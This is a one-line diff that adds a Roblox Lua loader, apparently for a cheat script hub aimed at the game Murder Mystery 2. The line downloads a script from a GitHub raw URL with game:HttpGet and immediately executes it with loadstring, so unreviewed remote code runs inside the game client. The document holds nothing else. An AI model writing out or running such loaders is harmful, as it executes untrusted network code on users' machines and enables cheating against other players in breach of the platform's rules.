@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/klayoseas/windowshub/main/Murder_Mystery_2.lua"))()
